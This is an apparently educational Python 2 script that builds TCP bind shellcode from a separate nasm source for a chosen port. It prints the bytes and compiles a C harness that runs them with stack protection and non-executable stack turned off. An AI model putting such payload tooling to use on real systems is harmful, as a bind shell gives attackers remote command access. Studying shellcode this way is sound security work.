#!/usr/bin/python

TARGET="bind"
DESCRIPTION="TCP bind shellcode"

import sys
import os
import socket
import binascii

if len(sys.argv) != 2:
    print "Generate a %s with a configurable listening port" % DESCRIPTION
    print "Usage: %s <port>" % sys.argv[0]
    sys.exit(1)

port = int(sys.argv[1])
if port < 0 or port > 65535:
    print "Invalid port number. Must be a number 0-65535."
    sys.exit(1)
    
print "Building %s on port %d" % (DESCRIPTION, port)

print "Assembling..."
r = os.system("nasm -f elf32 -o %s.o -DLISTEN_PORT=%d %s.nasm" % (TARGET, socket.htons(port), TARGET))
if r != 0:
    print "nasm returned error"
    sys.exit(1)
    
print "Linking to %s.elf..." % TARGET
r = os.system("ld %s.o -o %s.elf" % (TARGET, TARGET))
if r != 0:
    print "ld returned error"
    sys.exit(1)

print "Extracting text section to %s.raw..." % TARGET
os.system("objcopy -j .text -O binary %s.elf %s.raw" % (TARGET, TARGET))

raw = ""
with open("%s.raw" % TARGET, mode='rb') as f:
    raw = f.read()

hex_string = binascii.hexlify(raw)
hex_pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)] 
c_style = "".join(["\\x" + h for h in hex_pairs])
nasm_style = ",".join(["0x" + h for h in hex_pairs])

print "Embedding in test program shell_test.c"
with open("shell_test.c", mode='w') as f:
    f.write("#include <stdio.h>\n")
    f.write("#include <string.h>\n")
    f.write("unsigned char code[] = \"%s\";\n" % c_style)
    f.write("int main(int argc, char *argv[]) {\n")
    f.write("    printf(\"strlen(shellcode) = %d\\n\", strlen(code));\n")
    f.write("    int (*ret)() = (int(*)())code;\n")
    f.write("    ret();\n")
    f.write("}\n")

print "Compiling test program to shell_test..."
r = os.system("gcc -fno-stack-protector -z execstack shell_test.c -o shell_test")
if r != 0:
    print "gcc returned error"
    sys.exit(1)

print "\nC format:\n%s\n" % c_style
print "\nnasm format:\n%s\n" % nasm_style

print "Shellcode length: %d bytes" % len(raw)
if "\x00" in raw:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected."
